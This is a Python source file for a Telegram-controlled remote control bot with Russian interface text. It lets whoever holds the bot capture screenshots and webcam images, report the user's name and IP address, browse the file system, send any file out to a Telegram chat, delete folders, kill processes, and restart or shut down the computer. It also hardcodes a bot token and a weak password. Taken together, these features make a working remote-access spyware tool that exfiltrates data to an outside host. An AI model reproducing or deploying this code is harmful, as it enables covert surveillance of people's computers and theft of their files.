import telebot
import os
import requests
import platform
import subprocess
from PIL import ImageGrab
import cv2


bot_token = "1420175469:AAGdnC_BHnLx4O-GUE_NWzRDVeIaDIPhtsY"
chat_id = "633424212"
bot = telebot.TeleBot(bot_token)
islogged = False
password = "5360"

@bot.message_handler(commands=['login', 'Login'])
def send_message(command):
    user_msg = "{0}".format(command.text)
    if password == user_msg.split(" ")[1]:
        global islogged
        islogged = True
        bot.send_message(chat_id, "Вы авторизировались!" +
                     "\n\nВведите /commands")
    else:
        bot.send_message(chat_id, "Вы ввели неверный пароль")

@bot.message_handler(commands=['start', 'Start'])
def send_message(command):
    bot.send_message(chat_id, "Начинаю работу" +
                     "\n\nВведите /login и пароль" +
                     "\nCreated by Alexandr Repetsky")

@bot.message_handler(commands=['help', 'commands', 'Help', 'Commands'])
def send_message(command):
    bot.send_message(chat_id, "Команды: \n /Screen - Скриншот экрана \n /Info - Информация о вашем комьютере \n /kill_process (Имя) - остановить процесс" +
                    "\n /Pwd - Узнать текущую директорию" +
                    "\n /Ls - Узнать все папки и файлы в директории" +
                    "\n /Cd (путь до папки) - Перейти в папку \n /Download - Скачать файл \n /Rm_dir - Удалить папку \n /Cam - Получить картинку с веб камеры" +
                    "\n /About - О проекте \n /Restart - Перезагрузить компьютер \n /Off - Выключить компьютер")

@bot.message_handler(commands=["ls", "Ls"])
def ls_dir(commands):
    if islogged == True:
        dirs = '\n'.join(os.listdir(path="."))
        bot.send_message(chat_id, "Files: " + "\n" + dirs)
    else:
        bot.send_message(chat_id, "Вы не авторизированы")

@bot.message_handler(commands=["kill_process", "Kill_process"])
def kill_process(message):
    if islogged == True:
        user_msg = "{0}".format(message.text)
        subprocess.call("taskkill /IM " + user_msg.split(" ")[1])
        bot.send_message(chat_id, "Готово!")
    else:
        bot.send_message(chat_id, "Вы не авторизированы")

@bot.message_handler(commands=['screen', 'Screen'])
def send_screen(command) :
    if islogged == True:
        bot.send_message(chat_id, "Wait...")
        screen = ImageGrab.grab()
        screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg')
        screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')
        files = {'photo': screen}
        requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id , files=files)
    else:
        bot.send_message(chat_id, "Вы не авторизированы")

@bot.message_handler(commands=['info', 'Info'])
def send_info(command):
    if islogged == True:
        username = os.getlogin()

        r = requests.get('http://ip.42.pl/raw')
        IP = r.text
        windows = platform.platform()
        processor = platform.processor()

        bot.send_message(chat_id, "PC: " + username + "\nIP: " + IP + "\nOS: " + windows +
            "\nProcessor: " + processor)
    else:
        bot.send_message(chat_id, "Вы не авторизированы")

@bot.message_handler(commands=['pwd', 'Pwd'])
def pwd(command) :
    if islogged == True:
        directory = os.path.abspath(os.getcwd())
        bot.send_message(chat_id, "Текущая дериктория: \n" + (str(directory)))
    else:
        bot.send_message(chat_id, "Вы не авторизированы")

@bot.message_handler(commands=["cd", "Cd"])
def cd_dir(message):
    if islogged == True:
        user_msg = "{0}".format(message.text)
        path2 = user_msg.split(" ")[1]
        os.chdir(path2)
        bot.send_message(chat_id, "Директория изменена на " + path2)
    else:
        bot.send_message(chat_id, "Вы не авторизированы")

@bot.message_handler(commands=["Download", "download"])
def download_file(message):
    if islogged == True:
        user_msg = "{0}".format(message.text)
        docc = user_msg.split(" ")[1]
        doccc = {'document': open(docc, 'rb')}

        requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id,
                    files=doccc)
    else:
        bot.send_message(chat_id, "Вы не авторизированы")

@bot.message_handler(commands = ["Rm_dir", "rm_dir"])
def delete_dir(message):
    if islogged == True:
        user_msg = "{0}".format(message.text)
        path2del = user_msg.split(" ")[1]
        os.removedirs(path2del)
        bot.send_message(chat_id, "Директория " + path2del + " удалена")
    else:
        bot.send_message(chat_id, "Вы не авторизированы")

@bot.message_handler(commands=["Restart", "restart"])
def restart(message):
    if islogged == True:
        os.system("shutdown /r /t 1")
    else:
        bot.send_message(chat_id, "Вы не авторизированы")

@bot.message_handler(commands=["Off", "off"])
def off(message):
    if islogged == True:
        os.system('shutdown -s')
    else:
        bot.send_message(chat_id, "Вы не авторизированы")

@bot.message_handler(commands = ["About", "about"])
def about(commands):
    bot.send_message(chat_id, "Special bot for distance control \n\nCoded by Alexandr Repetsky")

@bot.message_handler(commands=["Cam", "cam"])
def cam(commands):
    if islogged == True:
        cap = cv2.VideoCapture(0)
        for i in range(30):
            cap.read()
        ret, frame = cap.read()
        cv2.imwrite('cam.png', frame)
        cap.release()
        bot.send_photo(chat_id, open('cam.png', 'rb'))
    else:
        bot.send_message(chat_id, "Вы не авторизированы")

bot.polling()
